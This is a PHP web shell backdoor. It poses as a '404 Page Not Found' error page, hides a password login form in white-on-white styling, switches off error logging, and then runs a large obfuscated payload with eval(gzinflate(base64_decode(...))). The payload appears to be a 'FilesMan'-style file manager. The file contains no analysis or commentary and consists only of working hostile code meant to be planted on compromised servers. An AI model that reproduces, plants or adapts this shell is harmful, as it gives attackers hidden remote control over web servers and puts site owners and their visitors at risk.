<?php
session_start();
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$password = "08dff4a1e22ef8db9655b71618e4d961"; //Password: CyberForceX
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';
function login_shell()
{
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found!</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #ffffff;
            font-family: Arial, sans-serif;
            color: #333;
            flex-direction: column;
        }

        .not-found-container {
            text-align: center;
            padding: 20px;
            background: white;
            box-shadow: none;
            border-radius: 0;
            margin-bottom: 10px;
            width: auto;
            max-width: none;
        }

        h1 {
            font-size: 60px;
            margin-bottom: 5px;
            color: #000000; 
        }

        p {
            font-size: 16px;
            margin-bottom: 5px;
        }

        .secret-login-form {
            position: relative;
            width: 200px;
            max-width: 90%;
            margin-top: 0;
            text-align: center;
        }

        .secret-login-form input[type="password"] {
            width: 100%;
            padding: 5px 8px;
            margin: 5px 0;
            border: 1px solid #ffffff;
            border-radius: 3px;
            font-size: 14px;
            box-sizing: border-box;
            background-color: #ffffff;
            color: #ffffff;
            caret-color: transparent;
            pointer-events: auto;
            outline: none;
            transition: none;
        }

        .secret-login-form input[type="password"]::placeholder {
            color: #ffffff;
            opacity: 1;
        }

        .secret-login-form input[type="password"]:focus {
            outline: 1px solid #cccccc;
            color: #333;
            caret-color: #333;
            background-color: white;
            border-color: #cccccc;
        }

        .secret-login-form input[type="password"]:focus::placeholder {
            color: #999;
        }

        .secret-login-form input[type="submit"] {
            width: auto;
            padding: 5px 10px;
            margin: 5px 0;
            background-color: #ffffff;
            color: #ffffff;
            border: 1px solid #ffffff;
            border-radius: 3px;
            cursor: pointer;
            font-size: 14px;
            outline: none;
            transition: none;
            pointer-events: none;
        }

        .secret-login-form input[type="password"]:focus + input[type="submit"],
        .secret-login-form input[type="submit"]:focus,
        .secret-login-form input[type="submit"]:hover {
            background-color: #f0f0f0;
            color: #333;
            border-color: #cccccc;
            pointer-events: auto;
        }

        .secret-login-form input[type="submit"]:focus {
            outline: 1px solid #cccccc;
        }
    </style>
</head>

    <body>
    <div class="not-found-container">
        <h1>404</h1>
        <p>Page Not Found</p>
        <p>The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
    </div>

    <div class="secret-login-form">
        <form action="" method="post">
            <input type="password" name="pass" placeholder="" required><input type="submit" name="submit" value="Go">
        </form>
    </div>
</body>
</html>
<?php
exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
} $Apaaja = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1KBrNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUMn0SyzJSMwLKMrMK85JrdRE\x41tY\x41";$iNathanPrinsley = "\x3d0OY\x42\x62PnZpJsNHlxZroSrL3L9T/\x62hfJs\x42fwFQxnhl5\x41E/JukwVmENHFzF6Z7HOnn3xwUGhEES2ehg3F2WJr3KUH9i93Q7IEHPk\x41WiTm\x41hUg\x634gr\x42Ggg4LNo1\x629poXtO8RgnhqIU08P/\x41VZYdwXyXS6688hm\x42fie1wZxVh57PiMv/F\x43NE8\x43PDp4L\x42nhqTqoVg1xuRNuxW3Vovo\x43Y6F\x2bu\x63y\x63li3X3X80hZvdKD\x2buDg\x2b8OmHS12q69IiWLXYTWklSF\x61fSIrJ5TJD4PNkmy\x2bimkLGlp0zu\x439E9P7H\x439h0j\x417JuuopF\x61rhiuEHf\x42HgDSDZZKisI74RutM0\x41jWx/1EZvM2DjfnZgPIe\x42pG\x61GdZR52VfVf8u8eioWPyzL7EPE2hkzU\x42UOPw/oTDlLXur0I7eMm9J4WF6\x435wEv\x42g\x43p\x412M7Ojgl\x61Qi7su\x633L3lD4IqkD/iVrPU\x42WO\x420\x42FzM45s\x43NDE\x41o7mOtnDJRPvzkfHE\x63jZzTsN\x41j2uXXI3\x61fpENSmwQNieY6l95UdR0qzzO\x63Z\x634qDlPzT0k3xvVw\x41V1o3u67sMMv\x2bqtME\x42HQnUJ9Nl\x43i3MLsP\x2by7IOF6eYql4N1tsLP1j4LLz7yNlpzh4nvE98VsoPiOPVErx9KhXfqi/\x2bJirrOQ\x433Md2J9lI\x612rnzinR\x2bUjZu4GUq\x43St0\x43g8\x42Jli2vRK7H\x413iSpMQFfhIweXEd19QTw\x42Wli\x63yetMJkstjZ8EWumvS\x43\x62QGWiIfH3Xd6\x2bQWPyyMtkvGRxFz7lDZt\x421HheqH/9DJ5K7IIPWThXlDZdG2Hk\x2bg5NF19\x43F6SvLhWsZlejhgX\x2bXJ0jNvZ\x41xt\x2bU9o1H4\x2bG\x42YonGOyp6vll\x41xYEF\x436RWM\x63GhLjV\x62n1kEvfDr\x42gQn6NJTM\x410HRDdlHVUh\x42yi\x63ItHGrVXRm1ZHyfys69XYSjvt0Z4\x62vJ\x438M\x413r5E9\x43kG\x43eGDy4z4\x42IjE1L\x41K\x62p\x62H24K\x61U6\x63M\x63fKqQw\x62WR\x2b8LSqrJY5WXqsyr\x2bTk\x62e1tt0n\x63mSw2XUwDzLjE/\x43r1\x61kE/QZWDX\x426r1RHLl\x61Ywm\x2btK2X\x61YpE8WpT6yNRWsz\x62QVStpv8\x61F9E/JQ4TvwxUE\x62YIYI6/\x2bXXLOm9\x61\x42mNEzVUI\x4320Lsi82FnQx\x62qvyWi\x41ztDvq9PrkwUyuXe\x63xytG5Y3YeeSQ1\x2bvrVG8kqZV\x2b93sD/tiZLGJWjJXfVQlhRK8QqNd5F\x43xU\x62Pd7Jq44Tv62\x428PkeFguj0fk0Tms\x43p/P9zP7eLGi4F9M6q\x61R3IvT3PtXLH\x2by\x41G/l\x43qT5e\x432U558NwDuzp\x2bIT75vJ/8tER/u\x2b\x2bpvOjfR/w\x62tGWzj\x2bz\x428O\x63\x2b9W5HfklT\x62O\x41oXfIxh5U4yYFfuD1M8kXJMu\x2b8KidXN\x42DO5Xx7y\x63UPFU4\x63Eg5W\x43\x2b\x610XUsTkZl9Qu2\x632t4iF\x624DH87YWzZdNFEL5eqh\x62EdxW17zjPu22fjiKT\x62pvWn3ZD75XzP5kdT\x624vouMXroe\x2b9551L\x62DuXTL5\x63JeL\x62kfivtk6S\x42v\x61\x4235\x63Lz1eK7\x61NfLJ/jIv\x62f77\x61j1I\x63rfPSzPR35LMNfYLsRjsHfYPQn/YV75WD3rSUKM/irk\x61Dp\x41N0XZOw1SHRw\x63MZfXh1wwlG6l\x61mnzoiqn\x2b8\x63S2zuSHVfYQWpzJL27O03Zlxf4s\x2b\x431UP0ydlG/hQ\x2bv9\x63twd5\x63Wgi\x43ZG4wSN9Wx37ogv\x2blflVdGdy3v\x625o9dk\x61kwfy4f9uYVH1gdlX2U\x43756zZtqUZPV\x62Fw8Uh6L8g\x61Xjz7e1\x2byn5oLnyXQqMpU5JiX\x63hkRXjjlDLW\x41IM9\x41wDm2Dy\x43wyvoJHM\x61j/zxuGxs8wm0Vk9J0kmwGS8y4qmV\x63Om4\x42T\x410I48HQHKlj\x43WgvlXUs5lI1VO5LUyU8\x2b6SooxzriKusix7\x61JIEhXtFK\x43UE19o6evkdXTXu6kw6XNIPTYr\x43V/WtX/ye8EgHE\x63GXZg6yr6\x43QFUOOVsTpZFejjDvyX\x62T\x42enNtUf\x61Fou8\x61fKHKnQ\x2bv1TJIv24d6J\x6277y\x438Gi308t9\x61pGH\x2b4\x63\x2b\x61yP\x63\x62L62P1ys8kqY/iZ\x63fShXI\x62qtW9DfVS4IeXywX8i4P2/pHI/zvNvm\x630KH\x63ui\x4105f/KyujnSGKH8SWf/w\x41K94iX9z4jPnpPSZ\x2b3jFeuq98LQkI\x4158d\x619KxLHD\x624Qy3YFdiS666g\x43SdEIxH\x2bT8/msd2drt\x42N7Wl5glLFy/Hp\x41rD0\x62GhJHLkDheS8lfPYt8n6XjHH\x62Y\x2b\x62sveU4kxLytp6rfus6iMz2sKZ5OPN\x63\x43Qq\x61Ytq\x2bYIR0LP\x62z\x42O\x61oY\x43pWx5ldKkwvXpVV653IzrMu\x61IxS5y\x42PDh5Wp8\x41\x41uK\x43LYjWq\x63qilPUOp8njJuerr5W43Knp\x63IS5eIwIj0l7Smhp6ILsSKgIn21\x43Vp6K1wLZ\x42/\x41IeeQPQkm3od3\x42RSoW/\x42fs\x2b//e\x2b/10\x61e\x432yYOYjkHp\x41sPy5Pp\x631qZDo0MzD\x41\x2b27\x43SUjjY4ySR\x62K4XU/zKV8XUUeDKDfLr82V6xjgp8XN4I\x41rmnlMEJgrhPm\x61Xxn7M6\x43gpM7Fe\x2bXQvoSmkfhRK\x2b9Jd7F/x\x61ZZEi0WhGLIS/eotT42YwS6kHt\x425wwHNUZrmS0miG\x61yf\x4354\x43\x62\x61\x2bu\x62ge\x42P\x62mL\x62z\x42KgJ\x62YjWqy345ElJgfv4x8REos7WKtwUVLFQSwr1dpowwFDik/4tn9Gl/u7V\x43qh0vrpU3sj14MIo8Qdt\x43hhED\x62ElJdN4W7VGjZnWqeZs\x63zR\x41WxOYSUwinyy9WQrH52\x2bWTEjt\x42Qjqo\x42wk\x2bwx8mKYW\x41pu\x43hX\x42mgWnwQ/lqtyS\x62Is6\x2bhshQELxQG1Z\x42hPKSTKOU4yxg\x63Ysz9fMFeMGqg9INvQPeDq\x42XWF67yn9W\x62EQIM9HrPu7\x2b8\x2bntMx9/rw95ZRhM\x4192s7O\x2bTNkwY\x630p5T\x61r\x424xpIv\x43fRgRT\x62dxv8D\x43LePvUQJzGG\x2bqsZ2zvFZXzkgYvDKJqNW2I\x62lYVmRzuEw2fJlJSJd45TxHds\x2b25Z6t7y0oFIOv3yf7TrdWeLmdMjp\x61jsLlmItefynT6p2UDrEn8Ymp4jDi\x61sEM2KY60FL\x43u/\x41em\x43Dxxf8nLniwn671fNU\x63px3ko\x62\x424t\x43hT93T29rmX3FQPshs\x63wepKXTUhPLMgNtYET2\x61DJDKirTmOPJUw7nxRQleWZLFtxiy\x2bl8oMssxUt8lTExV4fU\x43rk0d\x62\x63xOmd\x42rW7\x6272vPf\x2bd0sW\x61MEgrklG\x63\x41zfH7ZNXXuwlm\x41zvZFQs9lE8mMxpPW\x2bOMmPYF\x431\x43WZ0z/k\x427\x632\x61IJrHdiiIzh\x41G0Ksh8oxqlk\x43gqq8Lj3\x63Jk9oOyix2hUP3wokp75ZkXifD7xFU89K\x2bq\x63fU15\x63ql6WRyKtq3D2sp9G9Ow\x2bQ\x43zwXku1dvXthi\x61ZGuyUVfeY\x6103j0G8OuDfiuKO4YouXy1q\x2bOzsiHj8NMwLzpokyGpJiZnR5OV3\x42nvLNQoF9s\x62tq0/NY/\x43DIsF\x43W\x63NDr0QDPk\x41p\x42ltZQgzuZQ/n\x42\x43m5ZeeYj3sMJPjoKNxi6IWjZe\x41Ui4Ee3Qt47IqFLoFmngRYT9Zo\x42\x63uoLmYE\x61R80IwSNReWEJX/\x63fLUF\x43qH/3stI2DL\x43iwMj\x43FMIS\x43Vut\x43jZLOxEI\x43RlwTMn\x433ht2szEW\x42zUTOTe\x2beqMv5XtWl1gTKJP/s/qrr\x43roYZr\x62WYVQUXp4lUZ1pD\x2bFW3klgiklMdh5ZQh8Q4\x61Rikl\x41W1\x61m13YhKwdpNWxkwesiVNjTyFY\x422oNYnYpo6\x610wj\x43Q\x611\x43Mv\x42DL4hD9QqzKH\x63IJ\x61EU3\x4275g6RJZM8Trpg7y\x42O\x42\x617EOg9mSSNYevwh\x2bFrjnkvZvKxpv4QIJMsDDpSuV8YiyI6grWRWTTKxzop\x41e\x41U/h6/FhsLfo/z1xm1Yy4\x61\x61T\x41izE\x42SqXHYeEKqxFLuQI6Q0F2\x42Mg57Kg92pW3\x42qjTTnDFfgt\x41kYi2wynNtFTuXwh53\x42E7x/me3WvegqL7IjdYTk3nxg\x61ihHM1G4\x2b\x43fRYgP96l7Zfeq0STnOYKxKwGGTdxduim\x62zEk\x41wD8OFe\x41S\x62t\x42\x62tFD\x2b\x62o54w\x62i\x41K\x42ePNim\x43mQPhtdToFtxQeRjmOZ3GzESo52VH0WL3jxly\x2bpHhfHuE\x43YdN1oxGvfD2S\x2bf\x41xm4LTNi0yx/6P\x427D\x42Xt\x2b5Dr\x2bV7psdFZDOGyOnxUWdPzoS9u\x61fqzH\x61EQ\x41fPF\x42fO3I2vTd\x43Y3DrR2XeXYJRUyWgfyRE1U25yp215QRRQKnmXyX3hww\x43xRsysFXG4tl8sj4S3zxePqsj55v/RZLZd9R6\x63pU\x43\x62QU\x42ZhpN\x41jKquV\x42fhy\x42OSzpxFi6MiEOHOL0WvhX3lyZst9NNvjJ2i40\x2b4rQEh7minEWWkWh\x628HiJdsKPDUXfrPy\x63dUH2i/jnx3\x42\x6117RIzUt/kEkdqksN0S6JkS\x41xR/7Ltv0zs40IeRejPhJmjzDi5FWzKK3VS\x2bWDdwQ1l49nSgrY\x62TGkS4rIIZ5Z0\x430ovRL\x2bjTNr61g\x61JnORsMH1pzltqwEUzdU06Tp2\x62ZxlQGr3HX\x2bJPM4\x63V\x414KDV\x2bR\x61M\x61/tknJyn8S9EyLLk7XKk69j6neIe0ySZhUWTw0TM\x61KNxmQGr1djpp\x61F4gI4S\x41D2Kpyyo7TilVnV7Tm6873YV9jjEe5e\x63n75\x639euXE9dVem8NI4yv\x620jsvmFWW\x43eQ7VIpGXw4keoFz\x62LImkY0oZHfxLLPvlRelz8nSoenvvyZikI\x42XEOe\x42\x42IX8F0T5usPHm\x62KqHvT3SDhZji1I\x41iW/e\x611mDzgz\x63lO\x2bdmyMj\x63KdLHzy\x63PexuP\x61v\x61lwj\x2bY7R\x42VhRz4dJZe4\x41NEn7FXooDXYqj1Wh2H56\x2bNL4h9i1Wv32LP9\x419mZez\x2bidyR\x2bFGJnF\x63ZojtlHkK\x62uyGoDV6rDT\x414WSTGTsSO5DkgN/7N9te16py\x41z\x41M6plgL0S\x63Kpn5K/0XDyR126H\x43QOYUZ\x2bIKMl3\x62\x61Z\x2btDFD5yWQ\x41uw9ZljW\x427UiPIi\x63y\x63W4h2sMgFxpiyUYJ\x2br3N1kl8vZKTi3LOTMxR\x43g7H9dfy4Ykf1S\x2bW\x62yJnlg\x42\x63LYdL7rXEEEgv7JMNgL5tLxfl\x2b4QFpEe\x62Xe4WmnMLk5nZsXJ79\x639\x2bM0vZ59jEWh\x2bxvii\x420Ue\x42IqQJEpEJyHIgsnqxPDKmj2\x61\x43UXQYN\x2bLJR3Z5Q7SV5\x2b20\x43\x2b83n30pz/rT6zj1nW3g6\x63rHrdS4\x61dQ9G4y\x631O0UVPkwJ9HWWsIVkg5GnIq137IReWuhhF2y2THYR\x41MpRSi3Mqo32j\x632Qv\x42LKtK\x42mZ7\x41k/DJWOPQv\x61lnZeZSJ/yt\x41y1xwQFZqOg\x2b6\x619H\x42MMH\x61yvPZV3P25Tj3\x2b\x42/N\x2b/lsF\x42Ih8I4p52J5Rz1\x43\x41tGkFDdUMJRven2Pp3S\x42r\x2bYhx9MM7K16RFKZM8ffEkjwqGjkN\x2bgEd\x63U/MyO91JrN/\x41v9pt\x61KygTd00o62d1InNSlp\x41NrUHuTk82jVWkqKTeyNWJ\x42H0m\x62KDIu4ld\x62PIDW4jNn7\x43UksKKSnQJVVzsjwRpVln\x61TV9d2\x61pL1V3w\x63pDn0yHKF4dpVlLtrys31\x61pP5l2UVfnTHzeDhF76Tl\x42JfRJ0OElygr6\x63j2ylK4dGnP4l9N\x42W94gOWvvDsJUpt2nYgu7J\x2b\x41HNWrvj5pDGYQNw7IpIHfyXj6\x42FYYYr4Y\x2b1Dr0n\x62LNnxW\x61LSQ\x61ztjGyYHNFLMN52djZsrGiFfjuYX8j\x61T8m2\x43qS\x62\x2b7\x61Iz7\x61IW8\x61wl7Nmhu0oYg\x63WPdxIMxmfkyq6LLjs4YFUru7Vns\x62IPJlzq\x2b\x2b\x41R/zQUTZsMjkHYxuKXIWx2egH4G\x63wVVxQEmZvVi6s5\x4165J8hf6jl\x2bK3jFFwzM1Eh\x43OQm\x61O7JIGgnry\x42j8QI\x43QqnzRNkW\x41W0g\x43ytzWOgyYWD9u\x2b9t73rt72yPqvZK\x41Wvx/zsl7nv\x425O4xMI\x411O2mh1\x43VNH\x43zLONLJgvXqS\x42o\x41/\x61v\x2bp\x62j\x61/\x42pJLJyXfplxskgteogD2g5yrlQNwQyKWZKwm0oIhY2uofSJROF\x42jKMYhJ\x61L\x42SO\x41HE\x2b2UT5I\x62DYuYMTzE4GysePOhoVHvmeeV43g\x2bUvushEQzl\x63qwKzM\x63JQjOysNRquSU\x63KFei\x42zD3qrITlh\x2bDTy\x42DgU1S\x42yIK/PV\x63dVrQps4\x2bNSHSPSiK1o4Uof9EO5R\x43fPh\x62\x41\x2bT8PPNDu4veQdekeu8xpHfm6dtG39vW3g\x2b8jY2/RjHiUpWK2Q3Y\x2boqS\x42w5wS5o\x63mo\x61QjwPXMFRooYo9zTdIPy\x42KFZGUxKoe/3UFIy0PsUp0J9w3\x41Remeqx\x42dw0mJqte93K15edewNWpeXyViSNxR\x43Zo\x2b/\x2b196NRHNoeHxTMoWRiurTF\x2br\x63t\x2brWZG\x63Vmf9y3UvPktojy/p4D44kkv6Sy2LpW7V\x416PjVrDGM31QkmN\x624D\x42Xt\x2b58X5f4vxKN9utH4U/XE5mrnoMIzLDQn8vh/1r\x617J0gruKd60pT96\x63qWMiFg1\x426tk5qniF\x43p\x2b\x63Y/E3fh9DY/DmG4RTJ7ILWW0NlRJkkH4W9FqEWp9jMleSNE\x62ytF4M6\x61vysYHljwW1PIf\x41v\x62JS\x6272280e71Jhi\x42wJetrmEVGQ7lJhm\x42wJetrlElGQ7VJhq\x42wJetrkE1GQ7FJhu\x42wJe";eval(htmlspecialchars_decode(gzinflate(base64_decode($Apaaja))));exit;?>
